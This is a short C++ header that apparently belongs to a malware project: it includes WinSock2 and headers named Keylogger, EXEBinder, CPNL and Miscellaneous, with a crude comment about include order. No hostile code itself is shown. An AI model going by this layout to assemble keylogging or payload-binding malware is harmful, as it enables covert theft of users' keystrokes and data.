#pragma once

/*
	Need to include this shit here because in "Keylogger.h" there is "Windows.h"
	and there will be a linkage error if "WinSock2.h" is included after "Windows.h"
*/
#include <WinSock2.h>

#include "CPNL.hpp"
#include "Keylogger.hpp"
#include "Miscellaneous.hpp"
#include "EXEBinder.hpp"